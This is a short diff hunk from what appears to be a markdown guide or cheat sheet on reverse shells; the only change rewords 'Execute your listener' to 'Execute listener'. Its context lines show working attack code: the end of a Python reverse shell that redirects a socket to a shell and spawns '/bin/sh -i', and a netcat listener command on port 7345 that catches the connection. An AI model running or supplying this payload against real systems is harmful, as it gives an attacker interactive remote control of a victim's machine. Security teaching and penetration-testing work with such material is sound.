@@ -124,7 +124,7 @@ o.dup2(k.fileno(),2)
 c=p.call(["/bin/sh","-i"]);
 ```
 
-Execute your listener:
+Execute listener:
 ```
 nc -nvlp 7345
 ```
